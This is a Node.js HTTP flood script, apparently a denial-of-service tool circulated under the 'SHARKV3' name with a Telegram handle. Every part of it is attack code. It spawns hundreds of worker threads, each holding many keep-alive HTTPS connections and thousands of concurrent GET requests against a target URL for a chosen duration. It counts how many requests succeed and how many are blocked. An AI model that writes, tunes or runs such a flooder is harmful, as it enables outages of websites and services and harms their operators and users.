const https = require('https');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');
const readline = require('readline');
const net = require('net');
const url = require('url');

const THREADS = 48;
const INITIAL_CONNECTIONS = 50;
const POWER_MULTIPLIER = 5;
const MAX_INFLIGHT = 4000;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.clear();
    console.log(`SHARKV3-H1.1 FIXED - T.ME/STSVKINGDOM`);
    console.log(`Firing full power...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration, initial: true } });
    }

    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
        new Worker(__filename, { workerData: { target, duration, initial: false } });
    }

    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        renderStats();
        rpsLastSecond = 0;
    }, 1000);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        console.log(`SHARKV3-H1.1 FIXED - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`Blocked: ${errorCount}`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') totalRequests++, rpsLastSecond++;
            else if (msg === 'ok') successCount++;
            else if (msg === 'err') errorCount++;
        });
    });
    server.listen(9999);
} else {
    const { target, duration, initial } = workerData;
    const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
    const end = Date.now() + duration * 1000;

    const parsed = url.parse(target);
    const hostname = parsed.hostname;
    const port = parsed.port || 443;
    const path = parsed.path || '/';

    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    const agent = new https.Agent({
        keepAlive: true,
        maxSockets: 5000,
        maxFreeSockets: 5000
    });

    function createFlooder() {
        let inflight = 0;

        function send() {
            if (Date.now() > end || inflight >= MAX_INFLIGHT) {
                return setTimeout(send, 10);
            }

            inflight++;
            sendStat('req');

            const req = https.request({
                hostname,
                port,
                path,
                method: 'GET',
                agent,
                headers: {
                    'User-Agent': 'Mozilla/5.0',
                    'Connection': 'keep-alive',
                },
                rejectUnauthorized: false,
            }, res => {
                res.on('data', () => {});
                res.on('end', () => {
                    inflight--;
                    sendStat('ok');
                    setImmediate(send);
                });
            });

            req.on('error', () => {
                inflight--;
                sendStat('err');
                setImmediate(send);
            });

            req.end();
        }

        for (let i = 0; i < 100; i++) send();
    }

    for (let i = 0; i < connections; i++) {
        createFlooder();
    }
}
